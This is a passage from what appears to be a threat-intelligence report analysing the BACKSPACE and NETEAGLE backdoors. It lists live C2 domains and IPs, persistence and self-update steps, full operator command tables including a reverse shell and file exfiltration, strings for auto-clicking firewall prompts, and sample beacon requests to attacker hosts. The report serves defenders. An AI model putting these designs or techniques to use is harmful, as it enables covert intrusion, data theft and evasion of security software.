BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /\n```\nLnk1z/hostlist.txt. If the victim computer’s hostname is found in the response, BACKSPACE makes\n\n```\na new HTTP request to the primary C2 URL domain and URL path /Lnk1z/myapp.txt and saves the\nfile to <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt. Next, the downloaded file is copied to <CSIDL_\n```\nPROGRAMS>\\Messenger\\BIN as MessengerForVista.exe and if it is a valid PE file, a new process is\n\n```\nstarted.\n\nBACKSPACE will then delete the following files:\n```\n• <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt\n• <CSIDL_PROGRAMS>\\Messenger\\BIN\\UpdateMessenger.exe\n• <CSIDL_PROGRAMS>\\Messenger\\BIN\\MessengerPlug.exe\n• <CSIDL_PROGRAMS>\\Messenger\\BIN\\MessengerForVista.exe\n\n###### Self-Update Mechanism\n```\nBACKSPACE performs the following update tasks:\n\n1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL\ndomain and URL path /Lnk1z/ver.txt; if the version returned does not match the version of the\ncurrent binary (\"2.00MSNN\" for this sample), go to step 2.\n\n2. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /\n```\n  Lnk1z/exe.txt and saving the file to <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt.\n\n```\n3. Copy <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt to <CSIDL_PROGRAMS>\\Messenger\\BIN as\n\n\n-----\n\n4. If <CSIDL_PROGRAMS>\\Messenger\\BIN\\UpdateMessenger.exe is a valid PE, start a new process.\n\nIf the previous update task fails, BACKSPACE performs a new update task:\n\n1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL\ndomain and URL path /Lnk1z/SomeUpVer.txt; if the version returned does not match the version of\nthe current binary, go to step 2.\n\n2. Make an HTTP request to the primary C2 URL domain and URL path /Lnk1z/SomeUpList.txt and\nvalidate that the victim computer’s host name is in the response; if true, go to step 3.\n\n3. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /\n```\n  Lnk1z/SomeUpExe.txt and saving the file to <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt.\n\n```\n4. Copy <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt to <CSIDL_PROGRAMS>\\Messenger\\BIN as\n```\n  UpdateMessenger.exe.\n\n```\n5. If <CSIDL_PROGRAMS>\\Messenger\\BIN\\UpdateMessenger.exe is a valid PE, start a new process.\n\n###### Second Stage C2 Server\nNext, BACKSPACE makes an HTTP request to the primary C2 URL domain and URL path /Lnk1z/\n```\ndizhi.gif. Dizhi.gif is a 10-byte configuration file that specifies an IP address and three port numbers.\n\n```\nSecond stage C2 server information in dizhi.gif\n\n**IP: 112.117.9.222          Port1: 443   Port2: 443   Port3:82**\n\nBACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP,\nSystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain,\nand information about the logical drives) to Port1 on the new C2 server. The malware will use the victim\ncomputer’s saved proxy settings if needed. The data is sent using an HTTP POST request to the URL path\n```\n/index.htm.\n\n```\nBACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary\nC2 URL domain. If the victim computer’s hostname and hostid are found in the file, the victim will\nattempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to\ndirectly interact with the victim via the BACKSPACE controller. After establishing the connection to\nthe controller, BACKSPACE awaits further interactive commands from the operator. For this copy of\nBACKSPACE, the following commands are supported:\n\n\n**IP: 112.117.9.222          Port1: 443   Port2: 443   Port3:82**\n\n\n-----\n\n**Table 8: Commands supported by BACKSPACE \"ZJ\" variant 8c713117af4ca6bbd69292a78069e75b**\n\n|Command|Meaning|\n|---|---|\n|A|Same as J or S, but the file is deleted from the victim computer after transmission.|\n|B|Receive a folder and list of filenames from the C2 server; search the folder for the specified files (can use wildcards). For each file found, upload the encoded WIN32_FIND_DATA32 structure to the C2 server.|\n|C|Collects information about running processes (process name, process full path, owner account name, processID, thread count).|\n|D|Receive a folder path, a list of files, and a flag byte for each file from the C2 server. Delete files for which the flag is 0x30 and remove empty folders.|\n|E|Receive a file path, access byte (0 for WRITE, else APPEND) and encoded data from the C2 server. Open the file according to the access byte, decode the data, and write it to the file.|\n|F|Receive a Process ID (PID) from the C2 server; elevates privileges (SeTakeOwnershipPrivilege) of the process identified by the PID and terminate it.|\n|G|Receive a path from the C2 server; create a file for writing.|\n|H|Receive a path from the C2 server; create a folder.|\n|I|Receive two paths from the C2 server; perform a file rename operation.|\n|J|Receive a file path and offset from the C2 server. Read the file starting at the specified offset, encode the data, and send it to the C2 server.|\n|K|Receive a PID from the C2 server; terminate the process identified by the PID.|\n|M|Receive a path and a set of file attributes from the C2 server; apply the attributes to the file specified by the path.|\n|N|Receive a path to a folder from the C2 server; read the content of all the files from the folder and all sub-folders and upload their content after receiving acknowledgement from the C2 server.|\n|R|Receive a command line string from the C2 server and create a new process using the command.|\n|S|Same as J.|\n|T|Creates a reverse shell with redirected std input/output/error to pipes.|\n|U|Delete MSN.lnk from the <CSIDL_STARTUP> folder.|\n|V|Same as E, but the file is created in the folder <CSIDL_TEMPLATES> and executed.|\n|W|Enumerate network resources on the victim computer.|\n|X|Restart the C2 cycle from the self-update process (perform update, obtain secondary C2 details, send host details, receive commands, etc.).|\n|Y|Receive a list of filenames from the C2 server. Delete the file LwxRsv.tem in <CSIDL_TEMPLATES>; find the set of filenames specified by the C2 server; write the Name, LastWriteTime, nFileSizeLow for each file to LwxRsv.tem; send the content of this file to the C2 server and delete it.|\n|Z|“Cancel” command; sends *lecnaC* to the C2 server.|\n|a|Receive a registry key path from the C2 server; enumerate the registry values in the registry key and send the collected data to the C2 server.|\n|b|Receive a registry key path from the C2 server; create the specified registry key.|\n|c|Receive a registry value path, name, type, data, and size from the C2 server; create the specified registry value.|\n|d|Receive a registry key path from the C2 server; delete the registry key and all its sub-keys.|\n|e|Receive a registry value path from the C2 server; delete the registry value.|\n|f|Same as a command.|\n\n\n-----\n\nAfter each command is processed, BACKSPACE sends a status message to the C2 server:\n\n- A message starting with \"O\" indicates success.\n\n- A message starting with \"E\" indicates failure.\n\n###### BACKSPACE BACKDOOR – “ZR” VARIANT\nThe “ZR” branch of the BACKSPACE malware represents a later fork of the original “ZJ” version. Many\n“ZR” variants appear to be streamlined; that is, they may support a subset of the commands used by other\nBACKSPACE versions (both “ZJ” and “ZR” variants are compatible with the BACKSPACE controller;\nany non-supported commands simply ignored by the BACKSPACE client). However, some “ZR” variants\ninclude new features not seen in other versions of the backdoor, such as the ability to bypass host-based\nfirewall software.[33]\n\nThe BACKSPACE “ZR” variant with md5 hash 6ee35da59f92f71e757d4d5b964ecf00 was compiled on\n28 August 2014. While this sample may include features not present in other (or earlier) versions of\nBACKSPACE, much of the malware’s core functionality (such as the use of first-stage and second-stage\nC2 locations) has not changed significantly over time. As a recent example of the BACKSPACE malware\nfamily, this sample gives us both an overview of BACKSPACE’s functionality as well as a look at some of\nthe malware’s “current” features in the ZR branch.\n\n###### Initial Execution\nBACKSPACE creates the mutex MicrosoftZjZRLnk to ensure that only one instance is executing at any\ngiven time. It also creates two events (MicrosoftZjZRLnkExit and MicrosoftZjZRLnkHaveExit) that,\nwhen signaled, trigger all the threads and the malware itself to exit.\n\nThe malware extracts system information (OS version, build number, platform, service pack, default\nlanguage id) and proxy information (from the ProxyEnable and ProxyServer values under HKEY_\n```\nCURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\) from the victim\n\n```\nhost.\n\nBACKSPACE then creates the registry values lnk (type REG_SZ) and hostid (type REG_DWORD) under the\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\CurrentPnpSetup registry key:\n\n```\n- `lnk is set XJOXPSE/mol which is the encoded text WINWORD.lnk`\n\n- `hostid is set to a random value (used to uniquely identify a victim host).`\n\nThe malware then creates the directories <CSIDL_PROFILE>\\Microsoft Office and <CSIDL_PROFILE>\\\n```\nMicrosoft Office\\BIN. The malware is copied to a temporary file whose path is obtained by appending\n\n```\nthe .txt file extension to the current malware path and file name. The temporary file then is copied to\nthe newly created folder <CSIDL_PROFILE>\\Microsoft Office\\BIN as WINWORD.exe and the original\ntemporary file is deleted. For persistence, BACKSPACE creates the Windows shortcut file WINWORD.lnk\nin <CSIDL_STARTUP> or <CSIDL_COMMON_STARTUP> pointing to <CSIDL_PROFILE>\\Microsoft Office\\\n```\nBIN\\WINWORD.EXE with the description \"Microsoft Office Word\".\n\n###### C2 Domains\n```\nLike many BACKSPACE variants, this “ZRLnk” sample is configured with four different C2 domains. The\nC2 domains are used in HTTP requests for various files; each file requested via the URI provides additional\ninstructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes –\nthat is, each domain is associated with different URIs whose associated files support different functions.\n\n\n-----\n\nFor this sample, the four C2 domains have the following roles:\n\n             - Domain 1 (D1): www.bigfixtools[.]com. This is the primary first-stage C2 domain, used with the\n\nmajority of the URIs (and their associated functions).\n\n             - Domain 2 (D2): (www.km153[.]com) is the backup C2 domain, which can be promoted to the primary\n\nfirst-stage domain instead of D1 if necessary. It also can be used to obtain “run/hide” configuration\ndata (see below).\n\n            - Domain 3 (D3) and Domain 4 (D4) (www.km-nyc[.]com and www.bluesixnine[.]com, respectively)\n\nare used to obtain “run/hide” configuration data.\n\nThe C2 domains used by APT30 is a single malware sample range from the “brand new” to more\n“historical” domains that have been in existence (and use) for several years. For reference, sample\n```\n             6ee35da59f92f71e757d4d5b964ecf00 was compiled on 8/28/2014 at 09:12:33 GMT; the spear phishing\n\n```\nattacks that dropped this BACKSPACE variant occurred on 8/29/2014.\n\n**Table 9: BACKSPACE C2 domains and registration dates.**\n\n**Alias** **C2 Domain** **Description** **Zone Registration Date**\n\nD1 `www.bigfixtools[.]com` Primary C2 domain 8/26/2014\n\nD2 `www.km153[.]com` Backup C2 domain; run/hide configuration 8/30/2007\n\nD3 `www.bluesixnine[.]com` Run/hide configuration 12/4/2012\n\nD4 `www.km-nyc[.]com` Run/hide configuration 3/11/2004\n\n###### “Run” vs “Hide” Mode\nBACKSPACE reads the registry value hFlag under HKEY_CURRENT_USER\\Software\\Microsoft\\\n```\n             CurrentPnpSetup. If it exists and is set to 1, the malware switches to \"Run Mode\"; otherwise, the malware\n\n```\noperates in \"Hidden Mode\".\n\nTo switch to “Run mode”, BACKSPACE attempts to contacts its C2 servers for validation and to obtain\nconfiguration data (stored in a file named nur.txt). It parses the configuration data and performs a series\nof increasingly generic checks to see whether (by inclusion or exclusion) it should remain in “Run mode”.\nThe methodology is the same as described for the “ZJ” sample above, differing only in the C2 domains\nused and the specific URI paths requested.\n\n1. Make an HTTP request to www.bigfixtools.com/ForZRLnk3z/hostlist.txt and validate that the\nlast byte of the response is 0xFE.\n\n2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to\nobtain the external IP address of the victim host.\n\n3. Make an HTTP request to either www.bluesixnine.com/http/nur.txt, www.km153.com/\n```\n               http/nur.txt or www.km-nyc.com/http/nur.txt and validate that the response starts with\n\n```\n\"abcd1234\"; if none of the servers respond accordingly, setting \"Run Mode\" fails.\n\n|Alias|C2 Domain|Description|Zone Registration Date|\n|---|---|---|---|\n|D1|www.bigfixtools[.]com|Primary C2 domain|8/26/2014|\n|D2|www.km153[.]com|Backup C2 domain; run/hide configuration|8/30/2007|\n|D3|www.bluesixnine[.]com|Run/hide configuration|12/4/2012|\n|D4|www.km-nyc[.]com|Run/hide configuration|3/11/2004|\n\n\n-----\n\n4. If the response from the server contains the \"runhost=\" option, search for the victim computer’s\nhostname in the option data. If found, setting \"Run Mode\" succeeds; else go to step 5.\n\n5. If the response from the server contains the \"runhostexcept=\" option, search for the victim\ncomputer’s hostname in the option data. If found, setting \"Run Mode\" fails; else go to step 6.\n\n6. If the response from the server contains the \"runip=\" option, search for the victim computer’s\nexternal IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" succeeds; else go to\nstep 7.\n\n7. If the response from the server contains the \"runipexcept=\" option, search for the victim computer’s\nexternal IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" fails; else go to step 8.\n\n8. If the response from the server contains the \"rundir=\" option, search for the current C2 URL (e.g.,\nwww.bigfixtools[.]com/ForZRLnk3z or www.km153[.]com/ForZRLnk3z) in the option data. If found,\nsetting \"Run Mode\" succeeds; else go to step 9.\n\n9. If the response from the server contains the \"rundirexcept=\" option, search for the current C2 URL\nin the option data. If found, setting \"Run Mode\" fails; else go to step 10.\n\n10. If the response from the server contains the \"runweb=\" option, search for the current C2 domain (e.g.,\n\nwww.bigfixtools.com) in the option data. If found, setting \"Run Mode\" succeeds; else go to step 11.\n\n11. If the response from the server contains the \"runwebexcept=\" option, search for the current C2\n\ndomain in the option data. If found, setting \"Run Mode\" fails; else go to step 12.\n\n12. If the response from the server contains the \"runall=1\" option, setting \"Run Mode\" succeeds.\n\nIf switching to \"Run Mode\" fails, the malware exits.\n\nOnce the malware switches to \"Run Mode\" the hFlag registry value under HKEY_CURRENT_USER\\\n```\nSoftware\\Microsoft\\CurrentPnpSetup is deleted and the victims’ hostname and IP are saved.\n\n```\nA thread to switch the malware back to \"Hidden Mode\" is started. The thread runs indefinitely\nuntil the MicrosoftZjZRLnkExit event gets signaled; once signaled, the thread signals\n```\nMicrosoftZjZRLnkHaveExit event, does clean-up and exits.\n\n```\nSimilar to switching to “Run mode” BACKSPACE conducts a series of checks to attempt to switch to\n\"Hidden Mode\". The methodology is the same as described for the “ZJ” sample above, differing only in the\nC2 domains used and the specific URI paths requested.\n\n1. Make an HTTP request to www.bigfixtools.com/ForZRLnk3z/hostlist.txt and validate that the\nlast byte of the response is 0xFF.\n\n2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to\nobtain the external IP address of the victim host.\n\n3. Make an HTTP request to either www.bluesixnine.com/some/edih.txt, www.km153.com/\n```\n  some/edih.txt or www.km-nyc.com/some/edih.txt and validate that the response starts with\n\n```\n\"abcd1234\"; if none of the servers respond accordingly, setting \"Hidden Mode\" fails.\n\n\n-----\n\n4. If the response from the server contains the \"hidehost=\" option, search for the victim computer’s\nhostname in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 5.\n\n5. If the response from the server contains the \"hidehostexcept=\" option, search for the victim\ncomputer’s hostname in the option data. If found, setting \"Hidden Mode\" fails; else go to step 6.\n\n6. If the response from the server contains the \"hideip=\" option, search for the victim computer’s\nexternal IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" succeeds; else go\nto step 7.\n\n7. If the response from the server contains the \"hideipexcept=\" option, search for the victim\ncomputer’s external IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" fails;\nelse go to step 8.\n\n8. If the response from the server contains the \"hidedir=\" option, search for the current C2 URL (e.g.,\n```\n  www.bigfixtools[.]com/ForZRLnk3z or www.km153[.]com/ForZRLnk3z) in the option data. If\n\n```\nfound, setting \"Hidden Mode\" succeeds; else go to step 9.\n\n9. If the response from the server contains the \"hidedirexcept=\" option, search for the current C2\nURL (e.g., www.bigfixtools[.]com/ForZRLnk3z or www.km153[.]com/ForZRLnk3z) in the option\ndata. If found, setting \"Hidden Mode\" fails; else go to step 10.\n\n10. If the response from the server contains the \"hideweb=\" option, search for the current C2 domain\n\n(e.g., www.bigfixtools[.]com or www.km153[.]com) in the option data. If found, setting \"Hidden\nMode\" succeeds; else go to step 11.\n\n11. If the response from the server contains the \"hidewebexcept=\" option, search for the current C2\n\ndomain (e.g., www.bigfixtools[.]com or www.km153[.]com) is searched in the option data; if found,\nsetting \"Hidden Mode\" fails; else go to step 12.\n\n12. If the response from the server contains the \"hideall=1\" option, setting \"Hidden Mode\" succeeds.\n\nIf switching to \"Hidden Mode\" succeeds, the hFlag registry value under HKEY_CURRENT_USER\\Software\\\n```\nMicrosoft\\CurrentPnpSetup is created and set to 1.\n\n```\nIf BACKSPACE is successfully placed in “Run mode” it performs the following additional tasks:\n\n###### Primary vs Backup C2 Domains\nThe malware sends an HTTP request to www.km153[.]com/ForZRLnk3z/bak.txt. If the response starts\nwith \"qazWSX123$%^\", set the primary C2 domain to www.km153[.]com.\n\n###### Download Additional Files\nBACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/app.\n```\ntxt and saves the file to the path <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordPlug.exe. If the\n\n```\ndownloaded file is a valid PE file, start a new process.\n\nNext, BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/\n```\nhostlist.txt. If the victim computer’s hostname is found in the response, BACKSPACE sends a new\n\n```\nHTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/myapp.txt and saves the file to\nthe path <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordForVista.exe. If the downloaded file is a valid\nPE file start a new process\n\n\n-----\n\nBACKSPACE then deletes the following files:\n```\n• <CSIDL_PROFILE>\\Microsoft Office\\BIN\\Temp.txt\n• <CSIDL_PROFILE>\\Microsoft Office\\BIN\\UpdateWord.exe\n• <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordPlug.exe\n• <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordForVista.exe\n\n###### Self-Update Mechanism\n```\nBACKSPACE uses version control and will attempt to verify the current version and perform a selfupdate as follows:\n\n1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL\ndomain (www.bigfixtools[.]com or www.km153[.]com) and URL path /ForZRLnk3z/ver.txt; if the\nversion returned does not match the version of the current binary ( \"1.9.w.lY\" for this sample), go to\nstep 2\n\n2. Download a new binary by making an HTTP request to the primary C2 URL domain and URL\npath /ForZRLnk3z/exe.txt and saving the file to <CSIDL_PROFILE>\\Microsoft Office\\BIN\\\n```\n  UpdateWord.exe.\n\n```\n3. If <CSIDL_PROFILE>\\Microsoft Office\\BIN\\UpdateWord.exe is a valid PE, start a new process.\n\nIf the previous update task fails, BACKSPACE performs a secondary update task:\n\n1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL\ndomain and URL path /ForZRLnk3z/SomeUpVer.txt; if the version returned does not match the\nversion of the current binary, go to step 2.\n\n2. Make an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpList.txt\nand validate that the victim computer’s hostname is in the response; if true, go to step 3.\n\n3. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path\n```\n  /ForZRLnk3z/SomeUpExe.txt and saving the file to <CSIDL_PROFILE>\\Microsoft Office\\BIN\\\n  UpdateWord.exe.\n\n```\n4. If <CSIDL_PROFILE>\\Microsoft Office\\BIN\\UpdateWord.exe is a valid PE, start a new process.\n\nBACKSPACE uses the same mutex (MicrosoftZjZRLnk), and event names (MicrosoftZjZRLnkExit,\n```\nMicrosoftZjZRLnkHaveExit) across different versions of the same variant. Thus, the malware can\n\n```\nremove the previous version and update to a newer version while ensuring that only one instance of the\nsame backdoor family is installed on a given host.\n\n\n-----\n\n**Figure 24: Second stage C2 server information in dizhi.gif**\n\n\nWhen the malware is updated, the randomly generated hostid from the initial infection (stored in the\nregistry) is not changed. From the attacker’s perspective, this allows the “identity” of the victim host to\nremain consistent, even across multiple version updates.\n\n###### Second Stage C2 Server\nNext, BACKSPACE makes an HTTP request to the primary C2 URL domain (www.bigfixtools[.]com or\n```\nwww.km153[.]com) and URL path /ForZRLnk3z/dizhi.gif. Dizhi.gif is a 10-byte configuration file\n\n```\nthat specifies an IP address and two port numbers.\n\nBACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP,\nSystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain,\nand information about the logical drives) to Port1 on the new C2 server. The malware will use the victim\ncomputer’s saved proxy settings if needed. The data is sent using an HTTP POST request with the\nfollowing structure:\n\n\n-----\n\n**Table 10: BACKSPACE “ZRLnk” callback structure**\n\n**Offset** **Value** **Description**\n\n**0x00** 0x30 fixed (1 byte message identifier; 0x30 = ascii 0))\n\n**0x01** fd 00 00 00 data length = 253 bytes (4 byte length)\n\n**0x05** - computer name (varying length), 0x00\n\n**0x14** 192.168.43.130, 0x00 IP Address (varying length), 0x00\n\n**0x23** 253 version information (156 bytes)\n\n**0xBF** 04 08 language ID (2 bytes)\n\n**0xC1** 00 proxy on/off (1 byte)\n\n**0xC2** 41 18 00 00 host_id (4 bytes)\n\n**0xC6** 1.9.w.lY version string (varying length)\n\n**0xCE** (Proxy-No), 0x00 proxy setting (varying length), 0x00\n\n**0xD9** 0:7, 0x00 system uptime - H:M (varying length), 0x00\n\n**0xDD** www.bigfixtools.com/ForZRLnk3z, 0x00 URL where the second C2 IP is\nobtained(varying length), 0x00\n\nA sample beacon is shown below. Note that the HTTP User-Agent header is set to the non-standard value\n“SJZJ (compatible; MSIE 6.0; Win32)”.\n\n|Offset|Value|Description|\n|---|---|---|\n|0x00 0x01 0x05 0x14 0x23 0xBF 0xC1 0xC2 0xC6 0xCE 0xD9 0xDD|0x30 fd 00 00 00 - 192.168.43.130, 0x00 253 04 08 00 41 18 00 00 1.9.w.lY (Proxy-No), 0x00 0:7, 0x00 www.bigfixtools.com/ForZRLnk3z, 0x00|fixed (1 byte message identifier; 0x30 = ascii 0)) data length = 253 bytes (4 byte length) computer name (varying length), 0x00 IP Address (varying length), 0x00 version information (156 bytes) language ID (2 bytes) proxy on/off (1 byte) host_id (4 bytes) version string (varying length) proxy setting (varying length), 0x00 system uptime - H:M (varying length), 0x00 URL where the second C2 IP is obtained(varying length), 0x00|\n\n\n**Figure 25:**\nSample BACKSPACE\ncallback message\n\n\n-----\n\nBACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary\nC2 URL domain. If the victim computer’s hostname and hostid are found in the file, the victim will\nattempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to\ndirectly interact with the victim via the BACKSPACE controller.[35] After establishing the connection to\nthe controller, BACKSPACE awaits further interactive commands from the operator. For this copy of\nBACKSPACE, the following commands are supported:\n\n**Table 11: Commands supported by BACKSPACE \"ZRLnk\" variant**\n6ee35da59f92f71e757d4d5b964ecf00\n\n**Command** **Meaning**\n\n`A` Same as J or S, but the file is deleted from the victim computer after transmission.\n\n`B` Receive a folder and list of filenames from the C2 server; search the folder for the\nspecified files (can use wildcards). For each file found, upload the encoded WIN32_FIND_\n```\n       DATA[36] structure to the C2 server.\n\n```\n`D` Receive a folder path, a list of files, and a flag byte for each file from the C2 server. Delete\nfiles for which the flag is 0x30 and remove empty folders.\n\n`E` Receive a file path, access byte (0 for WRITE, else APPEND) and encoded data from the C2\nserver. Open the file according to the access byte, decode the data, and write it to the file.\n\n`J` Receive a file path and offset from the C2 server. Read the file starting at the specified\noffset, encode the data, and send it to the C2 server.\n\n`R` Receive a command line string from the C2 server and create a new process using the\ncommand.\n\n`S` Same as J.\n\n`V` Same as E, but the file is created in the folder <CSIDL_TEMPLATES> and executed.\n\n`X` Restart the C2 cycle from the self-update process (perform update, obtain secondary C2\ndetails, send host details, receive commands, etc.).\n\n`Z` “Cancel” command; sends *lecnaC* to the C2 server.\n\nAfter each command is processed, BACKSPACE sends a status message to the C2 server; messages\nstarting with “O” indicate success, messages starting with “E” indicate failure.\n\n###### Configuration and C2 Encoding\nWhile earlier versions of BACKSPACE may contain the C2 domains and other variables in plain text\nwithin the binary, they are encoded within this (and other more recent) variants. Decoding is done in two\nways: by adding an incremental counter, or by XORing and bitwise shifting bytes.\n\n|Command|Meaning|\n|---|---|\n|A|Same as J or S, but the file is deleted from the victim computer after transmission.|\n|B|Receive a folder and list of filenames from the C2 server; search the folder for the specified files (can use wildcards). For each file found, upload the encoded WIN32_FIND_ DATA36 structure to the C2 server.|\n|D|Receive a folder path, a list of files, and a flag byte for each file from the C2 server. Delete files for which the flag is 0x30 and remove empty folders.|\n|E|Receive a file path, access byte (0 for WRITE, else APPEND) and encoded data from the C2 server. Open the file according to the access byte, decode the data, and write it to the file.|\n|J|Receive a file path and offset from the C2 server. Read the file starting at the specified offset, encode the data, and send it to the C2 server.|\n|R|Receive a command line string from the C2 server and create a new process using the command.|\n|S|Same as J.|\n|V|Same as E, but the file is created in the folder <CSIDL_TEMPLATES> and executed.|\n|X|Restart the C2 cycle from the self-update process (perform update, obtain secondary C2 details, send host details, receive commands, etc.).|\n|Z|“Cancel” command; sends *lecnaC* to the C2 server.|\n\n\n-----\n\n**Figure 26: BACKSPACE string decryption by adding incremental counter**\n\n\n**Figure 27: BACKSPACE string decryption by XORing and bitwise shifting bytes**\n\n\nIn addition, binary (non-string) data transferred between the victim host and the second stage C2 server\nis encoded/decoded by adding an incremental counter and XORing with 0x23, as shown below.\n\n\n-----\n\n**Figure 28: Binary data encryption by adding an incremental counter and XORing**\n\n\n**Figure 29: BACKSPACE HTTP POST showing custom encoding**\n\n\n-----\n\n###### Host-Based Firewall Bypass\nThis variant of BACKSPACE includes functionality to attempt to bypass a number of personal firewall\napplications. BACKSPACE iterates through open windows and matches the type (Button) and its\nassociated Window Text against a set of strings stored within the malware. If a match is found,\nBACKSPACE sends a message to simulate a mouse click, attempting to “approve” firewall rules to allow\nthe malware to execute. Both English and Chinese strings are stored, implying that the malware attempts\nto target versions of the products below that are localized for those languages.[37]\n\n**Table 12: Strings used in attempt to bypass host-based firewalls**\n\n|Security Product|Meaning|\n|---|---|\n|Avira|Note action selected for this file (dangerous) 请注意为此文件选择的操作(危险)|\n|F-Secure|I trust the program. Let it continue. 我信任该程序。继续执行。 Do not show this dialog for this program again 不再为此程序显示此对话框|\n|AVG Firewall|Save my answer as a permanent rule, and do not ask me next time 将我的回答作为永久规则保存下来，下次不再询问。|\n|Sophos Firewall|Add the checksum to existing checksums for this application 将此应用程序的检查和添加到现有的检查和中。 Allow all hidden processes launched by 启动的所有隐藏进程访问网络|\n|Panda Security|Always allow the connection 总是允许此连接 TPSVARadioBtn, TPSVAButton|\n|McAfee|McXpBtn2, McAlertButtonClass|\n|Others|Trust 信任 Ignore 忽略 Allow 允许 Allow (recommended) 允许 (推荐) OK 确定 Remember this action 总是允许 Do not show this message again before rebooting Grant access Allow this change 运行|\n\n\n-----\n\n###### NETEAGLE BACKDOOR – “SCOUT” VARIANT\nThe NETEAGLE backdoor appears to have been developed after BACKSPACE, with early NETEAGLE\nsamples dating to 2008. The “Scout” variant (named for the mutex “Neteagle_Scout” used by this version)\nwas the earlier of the two. While NETEAGLE shares some similarities with BACKSPACE, including\nretrieval of commands from specific URIs, automatic updating, and a two-stage command and control\nstructure, NETEAGLE typically uses a single C2 domain (instead of up to four used by BACKSPACE) and\nsupports a more limited set of URIs for command retrieval. In addition, NETEAGLE supports an entirely\ndifferent set of commands than BACKSPACE; it is not compatible with the BACKSPACE controller and is\npresumed to have its own separate controller software. Later variants of NETEAGLE (e.g., the “Norton”\nversions) also support a modular “plugin” framework that allows the backdoor to load and execute DLLs\nfor additional functionality.\n\nThe NETEAGLE sample 3feef9a0206308ee299a05329095952a was compiled on 9 April 2009. The\nmalware creates the directory C:\\Program Files\\Messenger\\ and copies itself to that directory as\nmsmsgr.exe. NETEAGLE also creates the following registry value for persistence:\n\nValue: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\msmsgr\n\nData: C:\\Program Files\\Messenger\\msmsgr.exe\n\nNETEAGLE first attempts to retrieve the file allupdate.xml using the following HTTP request:\n```\nGET /yzstmfa/allupdate.xml HTTP/1.1\nUser-Agent: [filename of malware]\nHost: www.autoapec.com\nCache-Control: no-cache\n\n```\nThe file is saved to %DEFAULTUSERPROFILE%\\ieupdate.exe and executed.\n\nNETEAGLE then downloads hxxp://www.autoapec[.]com/yzstmfa/update.xml and decrypts the file\nwith the RC4 key \"ScoutEagle\". In the decrypted result, the malware looks for the hostname of the system.\nIf the hostname is present, the malware downloads hxxp://www.autoapec[.]com/yzstmfa/updateapp.\n```\nxml, saves it to %DEFAULTUSERPROFILE%\\visit.exe and executes the file.\n\n```\nOnce the initial update URLs are downloaded, the malware creates the mutex \"NetEagle_Scout\" and\nbegins the process of obtaining the second-stage C2 IP address(es) and port.\n\nNETEAGLE downloads the URL hxxp://www.autoapec[.]com/yzstmfa/pic1.bmp and RC4 decrypts\nthe first four bytes of the response using the key \"ScoutEagle\". The decrypted bytes are a callback IP. If\nthe victim computer is not configured to use a proxy, the malware sends a 363 byte UDP beacon to port\n6000 on the decrypted IP. If a proxy is enabled, the malware sends the same 363 byte beacon using the\nfollowing HTTP POST request:\n\n\n-----\n\n**Figure 30:**\nNETEAGLE\n'Scout' sample\nbeacon\n\n```\nPOST /index.htm HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Win32)\nHost: [Callback IP]\nContent-Length: 363\nConnection: Keep-Alive\nCache-Control: no-cache\n00000000 a3 0b cf 8b f9 56 ed bc be 0f 8b 6d b8 35 db 26 .....V.. ...m.5.&\n00000010 57 37 58 36 34 5f 41 4e 41 4c 59 53 49 53 00 c0 W7X64_AN ALYSIS..\n00000020 a8 38 6f 00 00 00 00 32 2e 31 38 00 69 6e 64 6f .8o....2 .18.indo\n00000030 77 73 20 58 50 20 36 2e 31 20 42 75 69 6c 64 37 ws XP 6. 1 Build7\n00000040 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 6b 601 Serv ice Pack\n00000050 20 31 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1...... ........\n00000060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n00000090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n000000A0 00 00 00 00 00 00 00 00 00 